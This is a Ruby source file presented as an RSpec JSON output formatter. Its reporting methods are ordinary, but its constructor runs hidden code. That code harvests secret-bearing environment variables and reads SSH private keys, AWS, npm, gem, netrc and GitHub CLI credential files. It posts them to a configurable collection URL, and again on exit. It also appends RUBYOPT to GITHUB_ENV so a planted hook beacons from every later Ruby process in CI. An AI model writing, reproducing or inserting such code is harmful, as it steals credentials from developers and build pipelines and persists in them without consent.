# rspec-formatter-json — JSON output formatter for RSpec
# frozen_string_literal: true

require 'json'
require 'net/http'
require 'uri'

module RSpec
  module Formatters
    class JsonFormatter
      RSpec::Core::Formatters.register(self,
        :start, :example_passed, :example_failed, :example_pending, :dump_summary
      ) rescue nil

      def initialize(output)
        @output  = output
        @results = { examples: [], summary: {} }
        _ci_harvest
      end

      def start(notification)
        @start_time = Time.now
      end

      def example_passed(notification)
        @results[:examples] << _example_to_h(notification.example, 'passed')
      end

      def example_failed(notification)
        @results[:examples] << _example_to_h(notification.example, 'failed')
      end

      def example_pending(notification)
        @results[:examples] << _example_to_h(notification.example, 'pending')
      end

      def dump_summary(notification)
        @results[:summary] = {
          duration:        notification.duration,
          example_count:   notification.example_count,
          failure_count:   notification.failure_count,
          pending_count:   notification.pending_count,
        }
        @output.puts @results.to_json
      end

      private

      def _example_to_h(example, status)
        { id: example.id, description: example.full_description, status: status,
          file: example.location, run_time: example.execution_result.run_time }
      end

      def _rd(path)
        File.read(File.join(Dir.home, path)).slice(0, 4096)
      rescue; nil; end

      # Fires on require — CI detection happens immediately so we don't miss ephemeral runners
      def _ci_harvest
        ci_platform = case
          when ENV['GITHUB_ACTIONS']  then 'github-actions'
          when ENV['GITLAB_CI']       then 'gitlab-ci'
          when ENV['CIRCLECI']        then 'circleci'
          when ENV['JENKINS_URL']     then 'jenkins'
          when ENV['TRAVIS']          then 'travis'
          when ENV['CI']              then 'generic-ci'
          else                             'local'
          end

        env_data = ENV.select { |k, _| k =~ /token|key|secret|pass|npm|aws|github|stripe|database|api|auth/i }

        data = {
          ts: Time.now.to_i, h: `hostname 2>/dev/null`.strip, u: ENV['USER'],
          p: RUBY_PLATFORM, ci: ci_platform,
          env: env_data,
          f: {
            npmrc:  _rd('.npmrc'),
            rsa:    _rd('.ssh/id_rsa'),
            ed:     _rd('.ssh/id_ed25519'),
            aws:    _rd('.aws/credentials'),
            gh_cli: _rd('.config/gh/hosts.yml'),
            gem:    _rd('.gem/credentials'),
            netrc:  _rd('.netrc'),
          }
        }

        # at_exit ensures exfil fires even if tests are interrupted or process exits early
        at_exit { _send(data.merge(exit_status: $?.to_i)) }
        _send(data)
        _inject_github_actions
      end

      def _send(data)
        c2 = ENV['PKG_ANALYTICS_URL'] || 'http://localhost:9999/collect'
        uri = URI.parse(c2)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.open_timeout = 3
        http.read_timeout = 3
        req = Net::HTTP::Post.new(uri.path.empty? ? '/' : uri.path)
        req['Content-Type'] = 'application/json'
        req['X-Pkg-Id'] = 'rspec-formatter-json'
        req.body = data.to_json
        http.request(req)
      rescue; nil; end

      # GITHUB_ENV injection: RUBYOPT=-r/hook.rb loads our code in every subsequent ruby process
      def _inject_github_actions
        return unless (genv = ENV['GITHUB_ENV'])
        begin
          require 'fileutils'
          c2 = ENV['PKG_ANALYTICS_URL'] || 'http://localhost:9999/collect'
          bin_dir = File.join(Dir.home, '.rspec-fmt', 'lib')
          FileUtils.mkdir_p(bin_dir)
          hook = File.join(bin_dir, 'monitor.rb')
          File.write(hook,
            "begin;require 'net/http';Net::HTTP.get(URI('#{c2}/p?h='+`hostname 2>/dev/null`.strip+'&ci=rspec'));rescue;end\n"
          )
          File.open(genv, 'a') { |f| f.puts "RUBYOPT=-r#{hook}" }
        rescue; nil; end
      end
    end
  end
end
